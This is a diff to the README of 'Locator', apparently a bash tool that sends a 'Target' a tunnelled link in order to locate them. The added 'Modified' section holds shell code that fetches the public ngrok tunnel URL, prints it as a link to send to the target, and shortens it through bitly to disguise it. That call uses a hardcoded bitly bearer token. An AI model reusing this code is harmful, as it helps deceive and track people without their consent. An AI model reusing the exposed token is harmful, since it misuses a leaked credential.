@@ -1,5 +1,6 @@
-# Locator v1.0
+# Locator v1.2
 ## Author: github.com/thelinuxchoice/locator
+## Modified by: github.com/itdaglog/locator-1
 ## IG: instagram.com/thelinuxchoice
 ### Don't copy this code without give me the credits, nerd! 
 
@@ -24,3 +25,21 @@ bash locator.sh
 Support the authors:
 
 <noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
+
+### Modified
+```
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
+send_link=$(cat link.txt)
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link
+
+bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq -r '.id')
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using bitly:\e[0m\e[1;77m %s \n' $bitly
+```
+
+### Software Included
+```
+- ngrok for linux
+- jq for linux
+
+Notes: if you're using Termux, please delete ngrox and jq files
+```
